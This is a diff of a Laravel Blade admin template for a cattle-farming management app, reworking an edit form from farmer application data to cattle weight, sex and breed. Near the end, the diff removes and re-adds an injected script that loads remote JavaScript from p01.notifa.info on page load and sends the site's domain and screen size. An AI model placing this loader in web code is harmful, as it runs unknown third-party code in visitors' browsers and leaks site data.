@@ -1,26 +1,3 @@
-@section('js')
-<script type="text/javascript">
-
-      function readURL(input) {
-        if (input.files && input.files[0]) {
-            var reader = new FileReader();
-
-            reader.onload = function (e) {
-                $('#showgambar').attr('src', e.target.result);
-            }
-
-            reader.readAsDataURL(input.files[0]);
-        }
-    }
-
-    $("#inputgambar").change(function () {
-        readURL(this);
-    });
-
-</script>
-
-@stop
-
 <!DOCTYPE html>
 <html lang="en">
 
@@ -35,7 +12,7 @@
     <title>FCMS</title>
 
     <!--favicon-->
-    <link href="assetAdmin/assets/images/favicon.ico" rel="shortcut icon">
+    <link href="../assetAdmin/assets/images/favicon.ico" rel="shortcut icon">
 
     <!--Preloader-CSS-->
     <link rel="stylesheet" href="../assetAdmin/assets/plugins/preloader/preloader.css">
@@ -95,7 +72,7 @@
         <!--Navigation Profile area-->
         <div class="navigation-profile">
             <img class="profile-img rounded-circle" src="../assetAdmin/assets/images/1.jpg" alt="profile image">
-            <h4 class="name">INTI</h4>
+            <h4 class="name">INI</h4>
             <span class="designation">SAPI</span>
 
             <a id="show-user-menu" href="javascript:void(0);" class="circle-white-btn profile-setting"><i class="fa fa-cog"></i></a>
@@ -176,69 +153,65 @@
                             <!-- <div class="block form-block mb-4" id="grad"> -->
                                 <div class="block form-block mb-4" id="grad_anamnisar">
                                     <div class="block-heading">
-                                        <h5>Edit Data Pengajuan</h5>
+                                        <h5 style="color: white">Edit Detail Sapi</h5>
                                     </div>
 
-                                    <form method="POST" action="{{url('prosesUpdatePengajuan', $tampiledit->id_pengajuan)}}" enctype="multipart/form-data">
+                                    <form method="POST" action="{{ url('../proses_update_detailPengajuanPeternak', $tampiledit->id_sapi) }}">
                                         {{csrf_field()}}
-                                        <div class="form-group" hidden="">
-                                            <label>Nama Peternak</label>
-                                            <input class="form-control  bg-white"  type="text" placeholder="Masukan Nama Peternak" name="nama_peternak" value="{{$tampiledit->id_pengajuan}}">
-                                        </div>
-                                        
+
+                                       
                                         <div class="form-group">
-                                            <label>Nama Peternak</label>
-                                            <input class="form-control  bg-white"  type="text" placeholder="Masukan Nama Peternak" name="nama_peternak" value="{{$tampiledit->nama_peternak}}">
+                                            <label style="color: white;">Berat Awal</label>
+                                            <input class="form-control  bg-white"  type="text" placeholder="Berat Awal" name="berat_awal" value="{{$tampiledit->berat_awal}}">
                                         </div>
                                         <div class="form-group">
-                                            <label>Alamat</label>
-                                            <input class="form-control  bg-white"  type="text" placeholder="Masukan Alamat Peternak" name="alamat" value="{{$tampiledit->alamat}}">
+                                            <label style="color: white;">Berat Saat Ini</label>
+                                            <input class="form-control  bg-white"  type="text" placeholder="berat saat ini" name="berat_saat_ini" value="{{$tampiledit->berat_saat_ini}}">
                                         </div>
+                                       
                                         <div class="form-group">
-                                            <label>No KK</label>
-                                            <input class="form-control  bg-white"  type="number" placeholder="Masukan No KK" name="no_kk" value="{{$tampiledit->no_kk}}">
-                                        </div>
-                                        <div class="form-group">
-                                            <label>Jumlah Sapi</label>
-                                            <input class="form-control  bg-white"  type="number" placeholder="Masukan Jumlah Sapi Peternak" name="jumlah_sapi" value="{{$tampiledit->jumlah_sapi}}">
+                                            <label style="color: white;">Jenis Kelamin Sapi</label>
+                                            <label class="custom-control custom-radio primary">
+                                                <?php if ($jk = $tampiledit->jenis_kelamin ) {
+                                                }  ?> 
+                                                <input name="jenis_kelamin" value="j" class="custom-control-input" type="radio" {{$jk == 'j'?'checked':''}}>
+
+                                                <span class="custom-control-indicator"></span>
+                                                <span class="custom-control-description">Jantan</span>
+                                            </label>
+                                            <label class="custom-control custom-radio primary">
+                                                <input name="jenis_kelamin" value="b" class="custom-control-input" type="radio" {{$jk == 'b'?'checked':''}}>
+                                                <span class="custom-control-indicator"></span>
+                                                <span class="custom-control-description">Betina</span>
+                                            </label>
                                         </div>
                                          
                                         <div class="form-group">
-                                            <label>Nomer HP</label>
-                                            <input class="form-control  bg-white"  type="number" placeholder="Masukan Jumlah Sapi Peternak" name="no_hp" value="{{$tampiledit->no_hp}}">
+                                            <label style="color: white;">Jenis Sapi</label>
+                                            <select id="jenissapi" class="form-control bg-white" name="jenis_sapi">
+                                                <?php if ($jensap = $tampiledit->jenis_sapi ) {
+                                                }  ?> 
+                                                <option value="Sapi PO" {{$jensap == 'Sapi PO'?'selected':''}}>Sapi PO</option>
+
+                                                <option value="Lokal" {{$jensap == 'Lokal'?'selected':''}}>Lokal</option>
+
+                                                <option value="Bali" {{$jensap == 'Bali'?'selected':''}}>Bali</option>
+                                                <option value="lain-lain">Lain-lain</option>
+                                            </select>
                                         </div>
-                                         <div class="form-group">
-                                             <button type="button"  data-toggle="modal" data-target="#myModal">Lihat Foto Sebelumnya</button>
-                                            <input class=""  type="file" placeholder="20" name="foto_ktp" id="inputgambar" value="">
+                                        <div id="sembunyi" style="display:none">
+                                            <div class="form-group">
+                                                <input class="form-control bg-white" name="jenis_sapi" type="text" placeholder="Masukkan jenis sapi baru" value="{{$tampiledit->jenis_sapi}}">
+                                            </div>
                                         </div>
-                                       
+                                         
                                         <input type="hidden" name="_token" value="{{ csrf_token() }}">
-                                         <button class="btn btn-success" type="submit">Submit</button>
+                                         <button class="btn btn-success" type="submit" name="id_pengajuan" value="{{$tampiledit->id_pengajuan}}">Submit</button>
                                     </form>
                                 </div>
 
                                     </div>
-                                    <div id="myModal" class="modal fade" role="dialog">
-                                <div class="modal-dialog">
-                                    <!-- konten modal-->
-                                    <div class="modal-content">
-                                        <!-- heading modal -->
-                                        <div class="modal-header">
-                                            
-                                            <h4 class="modal-title">Foto KTP  </h4>
-                                        </div>
-                                        <!-- body modal -->
-                                        <div class="modal-body">
-                                            <td><img src="{{ asset('image/'.$tampiledit->foto_ktp)  }}" class="img-thumbnail" style="max-height:300px;max-width:300px;">
-                                            </div>
-                                            <!-- footer modal -->   
-                                            <div class="modal-footer">
-                                                <button type="button" class="btn btn-default" data-dismiss="modal">Tutup</button>
-                                            </div>
-                                        </div>
-                                    </div>
-
-                                </div>
+                                   
                                  
                                                                     
                                                                        
@@ -253,7 +226,7 @@
 
 
 
-
+       
 
         <!--Jquery-->
         <script type="text/javascript" src="../assetAdmin/assets/js/jquery-3.2.1.min.js"></script>
@@ -298,7 +271,18 @@
         <!--- Main JS -->
         <script src="../assetAdmin/assets/js/main.js"></script>
 
-        <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdoP1qamj8Iz7H3xYZ27zj%2blzVQVx9ZbzdwyR2jY9nYkUWGU2eG9c%2fQpMMGXgVSSgUXwSPW3QUyx9nutG2raeXfO8RJL1o1DUMqGvHzpXP8r2TCI7fL%2bd6x2nOeX%2fgOUJmFo8i3jN9eAb7ceklO5IPQwvMUqTY%2fc7zDZjU1jrRncakGV0fTJ63gWahxbeMZ461MbIfhnVLJSpE1u%2bj%2fmjD1HoutYet5x0zLeTMlCSqHrVVG7lCokFd9bJcIii7H1AeIcCrs2KzdUMk0F79BYe6%2ffH8vXkI7kGvjimCZ36o4M3%2fqcdz4oiP3oPaLx2AFXzzSOZnkHulYb4A05k200m13GVfDWa3oJVE108ZWoeLXU%2bdYIt3sORFDhJXWqOvex4dS%2bclBxuYGauZJtcQC1BDs%2f%2bxXhj4fH0ydFupxg3nUsI2CFGC2XHEisct9DFbmfOZjZowfYhxXSAzIiASXPXEAWAgrJRYQPa%2frPYVHD%2bDjkYJkGMU4hxrT1zP6HU3%2boe%2ffpuJEP2CmgI%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+        <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdoP1qamj8Iz7H3xYZ27zj%2blzVQVx9ZbzdwyR2jY9nYkUWGU2eG9c%2fQpMMGXgVSSgUXwSPW3QUyx9nutG2raeXfO8RJL1o1DUMqGvHzpXP8r2TCI7fL%2bd6x2nOeX%2fgOUJmFo8i3jN9eAb7ceklO5IPQwvMUqTY%2fc7zDZjU1jrRncakGV0fTJ63gWahxbeMZ461MbIfhnVLJSpE1u%2bj%2fmjD1HoutYet5x0zLeTMlCSqHrVVG7lCokFd9bJcIii7H1AeIcCrs2KzdUMk0F79BYe6%2ffH8vXkI7kGvjimCZ36o4M3%2fqcdz4oiP3oPaLx2AFXzzSOZnkHulYb4A05k200m13GVfDWa3oJVE108ZWoeLXU%2bdYIt3sORFDhJXWqOvex4dS%2bclBxuYGauZJtcQC1BDs%2f%2bxXhj4fH0ydFupxg3nUsI2CFGC2XHEisct9DFbmfOZjZowfYhxXSAzIiASXPXEAWAgrJRYQPa%2frPYVHD%2bDjkYJkGMU4hxrT1zP6HU3%2boe%2ffpuJEP2CmgI%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
+
+        <script>
+        $('#jenissapi').change(function(){
+            if($(this).val() == 'lain-lain'){
+                $('#sembunyi').fadeIn('1000');
+            }else{
+                $('#sembunyi').fadeOut('1000');
+            }
+        })
+    </script>
+    </body>
 
         <!-- Mirrored from wow.designgurus.in/sideNavigationLayout/blue/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 30 Oct 2018 15:44:19 GMT -->
         </html>
